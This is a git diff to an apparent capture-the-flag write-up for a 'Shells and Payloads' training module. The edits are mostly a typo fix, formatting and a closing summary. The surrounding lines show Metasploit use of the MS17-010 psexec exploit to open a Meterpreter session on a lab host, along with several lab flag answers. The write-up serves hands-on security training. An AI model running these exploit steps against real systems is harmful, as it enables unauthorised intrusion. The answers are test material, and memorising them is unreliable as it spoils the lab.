@@ -214,7 +214,7 @@ Nmap done: 1 IP address (1 host up) scanned in 21.99 seconds
            Raw packets sent: 1126 (53.818KB) | Rcvd: 1066 (46.086KB)
 ```
 
-Here we can see, that the server is running Ubuntu. With a little help from Google, we figure out that Kernel 5.4 is part of Ubuntu 20.04. The answer is simply "ubunut"
+Here we can see, that the server is running Ubuntu. With a little help from Google, we figure out that Kernel 5.4 is part of Ubuntu 20.04. The answer is simply "ubuntu"
 
 --- 
 ### 4. Question
@@ -393,6 +393,7 @@ msf> ... set all options with username and pw from creds file...
 ```
 
 Now we have a shell:
+
 ![alt text](../assets/images/1785869954849-image.png)
 
 Moving into the right place and printing out the flag gives us the answer:
@@ -400,6 +401,7 @@ Moving into the right place and printing out the flag gives us the answer:
 ```shell
 B1nD_Shells_r_cool
 ```
+---
 
 ### 6. Question
 *What is the hostname of Host-3?*
@@ -425,6 +427,8 @@ Host script results:
 
 Provides us the host name "SHELLS-WINBLUE" (...eternalblue?...)
 
+---
+
 ### 7. Question
 *Exploit and... flag*
 
@@ -447,8 +451,10 @@ msf6 exploit(windows/smb/ms17_010_psexec) > exploit
 [*] Sending stage (175174 bytes) to 172.16.1.13
 [*] Meterpreter session 1 opened (172.16.1.5:4444 -> 172.16.1.13:49671) at 2026-08-04 15:45:28 -0400
 
-
+# Then printing out the flag to get the final answer.
 cat C:/Users/Administrator/Desktop/Skills-flag.txt
 
 
 ```
+
+This summarizes the Shells and Payloads module. This module provided a comprehensive overview of the available shell types, payload and methods to use against various kinds of targets.
